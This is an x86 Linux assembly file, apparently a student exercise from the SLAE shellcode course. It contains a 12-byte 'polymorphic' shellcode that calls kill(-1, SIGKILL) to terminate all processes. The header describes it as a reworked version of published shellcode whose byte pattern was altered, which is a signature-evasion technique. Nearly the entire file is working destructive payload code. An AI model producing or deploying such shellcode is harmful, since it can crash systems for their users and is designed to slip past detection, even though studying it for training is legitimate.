; Filename    : kill.asm
; Author      : Joris Hartog
; Date        : 07-12-2015
; Student     : SLAE-704
; Size        : 12 bytes
; Description : This program kills all processes. It is a
;  polymorphic version of a program that can be found at:
;   http://shell-storm.org/shellcode/files/shellcode-564.php
;  The original size was 9 bytes, this version is 12 bytes.


global _start

section .text

_start:

	push byte 37	;	mov al, 37
	pop eax		;
	xor ebx, ebx	;	push byte -1
	not ebx		;	pop ebx
	push byte 9	;	mov cl, 9
	pop ecx		;
	int 0x80	;	int 0x80
